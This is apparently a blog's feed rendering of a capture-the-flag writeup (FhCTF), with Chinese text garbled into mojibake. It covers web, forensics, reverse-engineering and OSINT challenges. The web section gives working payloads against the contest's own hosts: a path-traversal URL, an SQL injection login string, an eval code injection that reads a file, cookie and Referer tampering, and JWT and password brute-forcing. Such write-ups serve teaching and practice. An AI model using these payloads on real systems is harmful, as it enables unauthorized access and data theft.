&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1hFZhNSA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1Tq-hNrR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;ÂàÜÂ∑•Ë°®&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Â∫ßËôü&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;5&lt;/th&gt;
&lt;th&gt;14&lt;/th&gt;
&lt;th&gt;23&lt;/th&gt;
&lt;th&gt;34&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;‰∫ãÈ†Ö&lt;/td&gt;
&lt;td&gt;ÂØ¶È©ó&lt;/td&gt;
&lt;td&gt;Ë®òÈåÑÔºåÊìçÁ∏±ÔºåË®≠Ë®àÂØ¶È©óÔºåÁ∞°Â†±Ë£Ω‰Ωú&lt;/td&gt;
&lt;td&gt;ÂØ¶È©ó&lt;/td&gt;
&lt;td&gt;ÊãçÁÖßÔºåÂØ¶È©ó&lt;/td&gt;
&lt;td&gt;ÂØ¶È©ó&lt;/td&gt;
&lt;td&gt;Á¥ÄÈåÑ&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2&gt;The End&lt;/h2&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 10 Jun 2024 01:22:06 GMT</pubDate></item><item><title>FhCTF writeup</title><link>https://yih-0118.github.io/blog/fhctf/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/fhctf/</guid><description>OSINTÊ†πÊú¨ÊòØÈÄöÈùà</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/fhctf/&quot;&gt;https://yih-0118.github.io/blog/fhctf/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;ÂâçË®Ä&lt;/h2&gt;
&lt;p&gt;ÊØîË≥ΩÊàêÊûúÁ¥ÄÈåÑ
&lt;img src=&quot;https://hackmd.io/_uploads/SJkl6WGB0.png&quot; alt=&quot;ctfd.fhh4ck3rs.taipei_team&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hyv7p-zSC.png&quot; alt=&quot;ctfd.fhh4ck3rs.taipei_scoreboard&quot;&gt;&lt;/p&gt;
&lt;h1&gt;Writeup&lt;/h1&gt;
&lt;h2&gt;Web&lt;/h2&gt;
&lt;h3&gt;[Á©øË∂äÊ™îÊ°àÁöÑÊóÖ‰∫∫]&lt;/h3&gt;
&lt;p&gt;È°åÁõÆÊèêÁ§∫Âà∞Ôºö&lt;strong&gt;„Äåflag Âú® /flag.txt„Äç&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
    listen 80;
    server_name _;

    location / {
        root /html;
        index index.html index.htm;
    }

    location /img {
        alias /images/;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁôºÁèæÂèØ‰ª•Áî®img‰ΩúÁÇ∫Ë∑≥Êùø
Êîπ‰∏Ä‰∏ãurl: &lt;code&gt;https://travaling.fhh4ck3rs.taipei/img../flag.txt&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{how_1_tr4v3rs4l_7h3_w0rld!}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[A Web]&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;ÊàëÈÇÑÊòØdiesearchÂéªÁúã&lt;/del&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1Tr1eGH0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;Êúârobots.txtË™í&lt;/p&gt;
&lt;p&gt;ÂÖàÊâæÂà∞Á¨¨‰∏ÄÊÆµÔºö&lt;code&gt;FhCTF{1aSy_t0_f0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Êúâ‰∏ÄÂÄãÁôªÂÖ•Áï´Èù¢ÔºåÂèØ‰ª•Áî®sql injection&lt;/p&gt;
&lt;p&gt;username = &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;password = &lt;code&gt;&amp;#39;OR 1=1 --&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Á¨¨‰∫åÊÆµ&lt;code&gt;UnD_A_f1AG_c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ÁôªÂÖ•ÊàêÂäüÂæåÁúãÂà∞&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryu8eezBC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âú®&lt;code&gt;isAdmin&lt;/code&gt;‰∏≠ÊòØbase64Ê†ºÂºè&lt;/p&gt;
&lt;p&gt;Âè™Ë¶ÅÊîπÊàê&lt;code&gt;True&lt;/code&gt;ÁöÑbase64Ê†ºÂºè -&amp;gt; &lt;code&gt;VHJ1ZQ==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkCEGxGBA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{1aSy_t0_f0UnD_A_f1AG_cAn_u_f1ND_1T}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Gotcha]&lt;/h3&gt;
&lt;p&gt;ÊúÉÂÖàÁôºÁèæÈÄôÊòØgitÊ¥©Êºè
Âà©Áî®DotGitÊì¥ÂÖÖÂéªÊääzip‰∏ãËºâ‰∏ã‰æÜ
ÂÜçÊää‰∏üÂà∞SourceTreeÂéªÁúãÊ≠∑Âè≤Á¥ÄÈåÑ
&lt;img src=&quot;https://hackmd.io/_uploads/rJ-fHgMrC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{I_9iT_!7}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[BMI Ë®àÁÆóÊ©ü]&lt;/h3&gt;
&lt;p&gt;ÂéªÁúãÊ∫êÁ¢ºÔºåÊúÉÁôºÁèæÊúâ&lt;code&gt;eval()&lt;/code&gt;ÂèØ‰ª•ÈëΩ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1uCreGrR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÂÖàÊääË∫´È´òÈ´îÈáçÁî®burp suiteÊîî‰∏ã‰æÜ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJrKLxMrA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÊúÉÁôºÁèæÊòØÁî®stringsÂÇ≥ÈÄÅ&lt;/p&gt;
&lt;p&gt;ÊääÂÆÉÊîπÊàê
&lt;code&gt;{ &amp;quot;string&amp;quot;: &amp;quot;require(&amp;#39;fs&amp;#39;).readFileSync(&amp;#39;flag&amp;#39;, &amp;#39;utf8&amp;#39;)&amp;quot;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Â∞±ÂèØ‰ª•Âü∑Ë°å‰∫Ü&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJcp8efrR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{bReAk_bM1_cAcu1aT0r}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Login]&lt;/h3&gt;
&lt;p&gt;Áî®githackerÊäì‰∏ã‰æÜÂæåÂÜçÁî®source treeÂéªÁúã
&lt;img src=&quot;https://hackmd.io/_uploads/By0GPbESR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;FhCTF{r3m0ve_fr0m_F1LE_6U7_in_Rep0}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;[‰∏äÈéñ‰∫ÜÔºÅÔºü]&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;ÂÖàÁî®dirsearchÂÜçË™™&lt;/del&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1kPvxMHR.png&quot; alt=&quot;image&quot;&gt;
ÂæóÁü•ÊúâadminÔºåÂéªÁúãmain.jsÁôºÁèæÊúâ&lt;code&gt;#secret&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Skw2vefB0.png&quot; alt=&quot;image&quot;&gt;
ÊàëÂÄëÁü•ÈÅìÂú®flag.txtÔºå‰ΩÜÊàëÂÄëÊ≤íÊúâÊ¨äÈôêÈÄ≤ÂéªÔºåÊúÉË¢´403
ÊâÄ‰ª•Ë¶ÅÁî®burp suiteÊîî‰∏ã‰æÜÂæåÂä†ÂÖ•refererÂà∞locked.fhh4ck3rs.taipeiÂ∞±Â•Ω
&lt;img src=&quot;https://hackmd.io/_uploads/rJ36DgzrR.png&quot; alt=&quot;image&quot;&gt;
requestÂè™Ë¶ÅÈÄôÊ®£Â∞±Â•Ω&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /admin/flag.txt HTTP/2
Host: locked.fhh4ck3rs.taipei
Referer: http://locked.fhh4ck3rs.taipei
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJX1KlzHA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{4n_unl0cked_l0ck_15_s7up1d}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Information]&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;ÁúãÂà∞ÈÄ£ÁµêÁÑ°ËÖ¶ÂÖàÁî®dirsearch&lt;/del&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1T-0JGSA.png&quot; alt=&quot;image&quot;&gt;
ÁúüÁöÑÊúâÂ•ΩÊù±Ë•øË™íÔºå&lt;code&gt;/redoc&lt;/code&gt;
Âà∞ÁõÆÈåÑ‰∏ãÂéªÁúãÂ∞±Êúâ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/Bk-DRyfrA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{Y0u_r3411y_n33d_t0_l0ck_y0ur_API_d0cum3n75}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Information Ultimate]&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;ËÄÅÁîüÂ∏∏Ë´áÔºåÂÖàÁî®dirsearch&lt;/del&gt;
ÊúÉÁôºÁèæÊúâ&lt;code&gt;/docs&lt;/code&gt;ÂèØ‰ª•ÈÄ≤Âéª
ÊúâapiÂèØ‰ª•Áé©
ÂÖàÂà∞No One Can Pass
Èö®‰æøÊâìÔºåÊúÉË∑≥Âá∫&lt;code&gt;access-token&lt;/code&gt;ËÄå‰∏îÈÇÑÊòØ&lt;code&gt;jwt&lt;/code&gt;Ê†ºÂºèÁöÑ
&lt;img src=&quot;https://hackmd.io/_uploads/SkHD6ezSC.png&quot; alt=&quot;image&quot;&gt;
ÊàëÂÄëË¶ÅÁî®&lt;code&gt;jwt-cracker&lt;/code&gt;Êö¥ÂäõËß£ÂØÜÈë∞
&lt;img src=&quot;https://hackmd.io/_uploads/r1aiplfHA.png&quot; alt=&quot;image&quot;&gt;
ÁôºÁèæÂØÜÈë∞ÊòØ&lt;code&gt;secret&lt;/code&gt;
ÈÇ£ÈÄôÊ®£tokenÂ∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/BkIqAgfSC.png&quot; alt=&quot;image&quot;&gt;
ÂæóÂà∞flag~~~~
&lt;img src=&quot;https://hackmd.io/_uploads/B1LCAxzHC.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;FhCTF{N3w_ch4ll3ng3_1n_JWT_c95ceec4ea7d5414f10853e616da8e521f957e7627368a641e46fe74720b53b1}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;[Information Revenge]&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;Êàë‰ªçÁÑ∂ÂÖàÁî®dirsearch&lt;/del&gt;
ÊúâdocsÂèØ‰ª•ÈÄ≤Âéª
‰ΩÜÊòØË¶ÅÂ∏≥ÂØÜ
&lt;img src=&quot;https://hackmd.io/_uploads/SyN_WbfSA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;È°åÁõÆÊèêÂà∞Ôºå‰ª•‰ªñÁöÑÂêçÂ≠ó‰ΩúÁÇ∫Êìî‰øùÔºåusernameÂ∞±ÊòØCXPh031x&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rylLWbzHR.png&quot; alt=&quot;image&quot;&gt;
ÂÖàÁî®burp suiteÊîî‰∏ã‰æÜÁúãÔºåÁôºÁèæÊòØÁî®&lt;code&gt;username:password&lt;/code&gt;ÁöÑÊñπÂºèÈ©óË≠â
ËÄå‰∏îÈÇÑÂ•óÁî®base64Ê†ºÂºè
&lt;img src=&quot;https://hackmd.io/_uploads/BJUgzWGH0.png&quot; alt=&quot;image&quot;&gt;
Áü•ÈÅìÈÄô‰∫õÂæåÔºå&lt;del&gt;Â∞±ÂèØ‰ª•ÁàÜÁ†¥‰∫Ü&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1bSXZfHA.png&quot; alt=&quot;image&quot;&gt;
ÈÄôÊ®£Â∞±Áü•ÈÅìÂØÜÁ¢ºÊòØ&lt;code&gt;Password1&lt;/code&gt;‰∫Ü
ËÉΩÈÄ≤Âà∞apiÈÇ£ÈÇäÁõ¥Êé•ÊãøÂà∞flag&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{W34k_p455w0rd_m4y_c4u53_d4ng3r}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Baking Store]&lt;/h3&gt;
&lt;p&gt;ÁôºÁèæÊòØË¶ÅÁ≠âÊóóÂ≠êÁÉ§Â•Ω
&lt;img src=&quot;https://hackmd.io/_uploads/Hk3zfeQrR.png&quot; alt=&quot;image&quot;&gt;
ÊàëÂÄëÂÖàÁî®burp suiteÊîî‰∏ã‰æÜÔºåÊúâÁúãÂà∞‰∏Ä‰∏≤ÁâπÊÆäÁöÑcookie
Áî®cipheyÁúãÔºåÁôºÁèæÊòØÈÄôÊ®£ÁöÑÂä†ÂØÜÊñπÂºè
&lt;img src=&quot;https://hackmd.io/_uploads/HJnYGl7r0.png&quot; alt=&quot;image&quot;&gt;
ÂÜçÊääÊôÇÈñìÊîπÊàê0ÁßíÂ∞±Â•ΩÊëüÂõâ
&lt;img src=&quot;https://hackmd.io/_uploads/HJ5N7lXS0.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJUHQe7rC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{Cl13nt_s1d3_auth0r1z3d_1s_d4ng3r!!!!}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Baking Store Revenge]&lt;/h3&gt;
&lt;p&gt;ÈÄ≤ÂéªÊúÉÊúâ‰∏ÄÂÄãÁôªÂÖ•È†ÅÈù¢ÔºåÂÖàÈö®‰æøË®ªÂÜäÂæåÂÜçÁôªÂÖ•ÁúãÁúã
&lt;img src=&quot;https://hackmd.io/_uploads/HJXbEe7SC.png&quot; alt=&quot;image&quot;&gt;
ÁúãÁúãËÉΩ‰∏çËÉΩ‰øÆÊîπurlÊâæÂà∞flag
Âú®&lt;code&gt;65536&lt;/code&gt;ÁöÑÂú∞Êñπ
&lt;img src=&quot;https://hackmd.io/_uploads/rypN4eQHR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{IDOR_1s_t3rr4bl3_w1th_n0_l1m173d...}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Forensics&lt;/h2&gt;
&lt;h3&gt;[MitM ÊîªÊìäËÄÖ]&lt;/h3&gt;
&lt;p&gt;‰∏ãËºâÊ™îÊ°à
‰∏üÈÄ≤wireshake
ÂæûÈ°åÁõÆ‰∏≠ &lt;strong&gt;‰∏çË¶ÅÁî®‰∏çÂÆâÂÖ®ÁöÑÂçîÂÆö&lt;/strong&gt;
ÂéªÊâæÊúÄÁâπÂà•ÁöÑÂçîÂÆö
&lt;img src=&quot;https://hackmd.io/_uploads/BytTTgMrA.png&quot; alt=&quot;image&quot;&gt;
Â∞±ÊâæÂà∞flag‰∫Ü&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;fhsfctf{w1ll_a1w4y5_pr3v4il}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Hex Dumb Dumb]&lt;/h3&gt;
&lt;p&gt;È°åÁõÆÁµ¶‰Ω†‰∏ÄÂÄã&lt;code&gt;.chal&lt;/code&gt;Ê™îÊ°àÔºå‰ΩÜÂÖ∂ÂØ¶‰ªñÊòØÂºµÂúñÁâá
&lt;img src=&quot;https://hackmd.io/_uploads/Bksp6ZGB0.jpg&quot; alt=&quot;HexDumbDumb&quot;&gt;
ÊääÈÄôÂºµstringsÂá∫‰æÜÁúãÔºåÊäästringsÊúÄÂæåÈÉ®ÂàÜÊãø‰æÜÁúã
Êäì&amp;quot;)&amp;quot;‰∏äÈù¢&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FFFFFF
))))))
hhhhhh
))))))
HHHH
C))C
TTTTTt
)))))t
FFFFFF
))))))
)){){)
HHHHHH
))))))
hhhhhh
hhhhhh
##3###
d))d
DDDDdd
DDDD))
u)))
UUUU
)))m
MMMM
pppppp
))))))
PPPP
nnnn
))))
NNNN
##3###
##3###
d))d
DDDDdd
DDDD))
)))m
MMMM
0000
0))))0
))))))
))))
)))r
##3###
##3###
C))C
UUUUU
U)))))
uuuuuu
uuuuu
RRRRRR
))))))
##3###
]})})]
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{H3xdump_n33d_m0r3_S3CUR3}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Do you know packet?]&lt;/h3&gt;
&lt;p&gt;ÊâìÈñãÈ°åÁõÆÂ∞ÅÂåÖÂæåÁôºÁèæË∑üusbÊúâÈóú
‰πãÂæåÂà∞ÈÄôÈÇäËºâÂ∑•ÂÖ∑
&lt;a href=&quot;https://github.com/horosora/wireshark-usb-keyboard-analyzer/tree/master&quot;&gt;https://github.com/horosora/wireshark-usb-keyboard-analyzer/tree/master&lt;/a&gt;
ËºâÂ•ΩÂæå‰∏üÂà∞wireshark
ÂÜçÁî®wiresharkÊâìÈñãÂ∞ÅÂåÖ‰∏¶‰ΩøÁî®Â∑•ÂÖ∑
ÂæóÂà∞flag
&lt;img src=&quot;https://hackmd.io/_uploads/HJqWzZNHC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{a_S1mp13_USB_C@p7uRe}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Reverse&lt;/h2&gt;
&lt;h3&gt;[BabyReverse]&lt;/h3&gt;
&lt;p&gt;ÂéªÁî®idaÂéªÁúãprint_flag()
&lt;img src=&quot;https://hackmd.io/_uploads/HkbHi-zSA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;v3 = [57, 23, 60, 43, 57, 4, 38, 79, 10, 32, 30, 13, 76, 32, 29, 75, 29, 6, 32, 13, 76, 9, 76, 13, 74, 76, 32, 26, 17, 24, 78, 17, 76, 76, 13, 91, 90, 89, 2]
s = &amp;#39;&amp;#39;.join(chr(byte ^ 0x7F) for byte in v3)
print(s)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{Y0u_ar3_b4by_r3v3r53_eng1n33r$%&amp;amp;}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Secret Message]&lt;/h3&gt;
&lt;p&gt;ÂÖàÁî®idaÊâìÈñã
&lt;img src=&quot;https://hackmd.io/_uploads/SyQJmWVrA.png&quot; alt=&quot;image&quot;&gt;
ÊúÉÁôºÁèæË™™ÈõñÁÑ∂‰ªñÁî®rand
‰ΩÜÂõ†ÁÇ∫srandÊúâÁµ¶Á®ÆÂ≠êÁ¢ºÔºåÊâÄ‰ª•Âü∫Êú¨‰∏äÊØèÊ¨°Âü∑Ë°åÁöÑÊôÇÂÄô
Èö®Ê©üÊï∏ÈÉΩÊòØÁõ∏ÂêåÁöÑ
ÁÑ∂ÂæåÊúâÁµ¶flagË¢´Âä†ÂØÜÂæåÁöÑÊ™îÊ°à
&lt;img src=&quot;https://hackmd.io/_uploads/Sk9NQZNr0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÊâÄ‰ª•ÂèØ‰ª•‰æÜÊö¥ÂäõËß£
ÊääÂèØË¶ñÂ≠óÂÖÉÁï∂‰Ωúflag
‰πãÂæåÂü∑Ë°å&lt;code&gt;enc flag&lt;/code&gt;
Â¶ÇÊûúencÂæåÁöÑÁµêÊûúÁ≠âÊñº751
ÈÇ£Â∞±Ë®òÈåÑ‰∏ã‰æÜ
ÁÑ∂ÂæåÁπºÁ∫åÂæÄ‰∏ãË∑ë
Â¶ÇÊûúencÂæåÁöÑÁµêÊûúÁ≠âÊñº707
ÁπºÁ∫åË®òÈåÑ‰∏ã‰æÜ
Âà∞ÊúÄÂæåÂ∞±ÊúÉÊúâflag‰∫Ü&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;solve&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
seed = [751, 707, 513, 755, 627, 1036, 1005, 109, 682, 674, 252, 671, 247, 259, 439, 526, 318, 574, 742, 135, 709, 731, 495, 872, 436, 827]
key = &amp;quot;!\&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~&amp;quot;
ans = &amp;quot;&amp;quot;
origin = &amp;quot;&amp;quot;
for i in range(len(seed)):
    for j in key:
        origin = ans
        origin = origin + j
        with open(&amp;quot;flag&amp;quot;, &amp;quot;w&amp;quot;) as file:
            file.write(origin)

        r = process([&amp;quot;./enc&amp;quot;, &amp;quot;flag&amp;quot;])
        gg = r.recvall()
        nums = [int(x) for x in gg.decode().split()]
        if nums[i] == seed[i]:
            ans+=j
            break
    
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;[BabyReverse Revenge]&lt;/h3&gt;
&lt;p&gt;ÂéªÁî®idaÂéªÁúãprint_flag()
&lt;img src=&quot;https://hackmd.io/_uploads/Hk4KaJXS0.png&quot; alt=&quot;image&quot;&gt;
v9ÁÇ∫Âä†ÂØÜÊï∏ÂÄºÔºåv4=127ÊòØXORÈë∞ÂåôÔºåv5=35Ëß£ÂØÜÁöÑÂ≠ó‰∏≤Èï∑Â∫¶
Áî® for ÂòóË©¶0~255 ÂàÜÈÖçË®òÊÜ∂È´îÂÑ≤Â≠òËß£ÂØÜÂ≠ó‰∏≤
Áî®forÈÄ≤Ë°å XOR ÈÅãÁÆó‰πãÂæåprintfÊØèÂÄãÂèØËÉΩ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void print_flag() {
    int v9[] = {121, 87, 124, 107, 121, 68, 104, 87, 70, 96, 124, 8, 121, 12, 77, 76, 96, 
                83, 14, 84, 12, 96, 77, 12, 73, 12, 81, 88, 12, 17, 17, 27, 0, 27, 66};
    int length = 35;

    for (int key = 0; key &amp;lt; 256; ++key) {
        char *s = (char *)malloc(length + 1);
        if (!s) {
            printf(&amp;quot;Memory allocation failed\n&amp;quot;);
            return;
        }

        for (int i = 0; i &amp;lt; length; ++i) {
            s[i] = key ^ v9[i];
        }
        s[length] = &amp;#39;\0&amp;#39;;

        printf(&amp;quot;Key %d: %s\n&amp;quot;, key, s);

        free(s);
    }
}

int main() {
    print_flag();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJP6RkmHA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Flag:&lt;code&gt;FhCTF{Why_C7F3rs_l1k3_r3v3ng3..$?$}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;[Áúü„ÄÇÈÄÜÂêëÂ∑•Á®ã]&lt;/h3&gt;
&lt;p&gt;ÂÖ∂ÂØ¶ÊâæÂà∞print_flag functionÂæåÁÖß‰ªñÁöÑÁî®‰∏ã‰æÜÂ∞±Âá∫‰æÜ‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdint&amp;gt;
using namespace std;
void print_flag() {
    int i, j, k;
    uint64_t v4[7];
    uint64_t v6[13];
    char v7[10];
    char result[57]; 
    v6[0] = 0x30602D1979572B0BLL;
    v6[1] = 0x44191E0B2C405607LL;
    v6[2] = 0x1B777409180F6D6FLL;
    v6[3] = 0x2A0F022A52672416LL;
    v6[4] = 0x601B25524E775D7DLL;
    v6[5] = 0x2C2D25635B640649LL;
    v6[6] = 0x527A4B6640082160LL;
    v6[7] = 0x71E2064576E5B5BLL;
    v6[8] = 0x342B373625031C69LL;
    v6[9] = 0x7C0972711E5E5D23LL;
    v6[10] = 0x191D703028635C21LL;
    v6[11] = 0x405D1C7E0B601446LL;
    v6[12] = 0x62611D4B320D6C78LL;
    memcpy(v7, &amp;quot;GQ6,/rqswO&amp;quot;, 10);
    v4[0] = 0x48633E0137730E24LL;
    v4[1] = 0x722D6E6F3E295F53LL;
    v4[2] = 0x2738791141693007LL;
    v4[3] = 0x7965302D5A09586CLL;
    v4[4] = 0x17B38197D691A1ELL;
    v4[5] = 0x78097A453D3C5554LL;
    v4[6] = 0x182D517B73331FLL;
    for (i = 56; i &amp;gt; 0; --i)
        *((uint8_t *)v4 + i) ^= *((uint8_t *)v4 + i - 1);
    for (j = 0; j &amp;lt; 0x39; ++j)
        *((uint8_t *)v4 + j) ^= 0x69;
    for (k = 0; k &amp;lt; 0x39; ++k)
        *((uint8_t *)v4 + k) ^= *((uint8_t *)v6 + k);
    memcpy(result, v4, 56);
    cout &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl;
}

int main() {
    print_flag();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{Tru3_R3v3rs3?Y0u_m4y_h4v3_s0m3_m1sund3rs74nd!!%^&amp;amp;#}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Osint&lt;/h2&gt;
&lt;h3&gt;[Á•≠]&lt;/h3&gt;
&lt;p&gt;Â•≥Â∑´ÊàëÊúÉÊÉ≥Âà∞ÂåóÊäïÂçÄ
&lt;del&gt;(ÁµïÂ∞ç‰∏çÊòØÂæ©ËààÈ´ò‰∏≠Â∞±Âú®ÂåóÊäï)&lt;/del&gt;
ÂåóÊäïÊàëËÉΩÊÉ≥Âà∞ÁöÑÊôØÈªû:(1.ÂåóÊäïÂÖ¨Âúí 2.Ê∫´Ê≥âÂçöÁâ©È§® ==3.ÊñáÁâ©È§®==)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FhCTF{112Âè∞ÂåóÂ∏ÇÂåóÊäïÂçÄÂπΩÈõÖË∑Ø32Ëôü}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
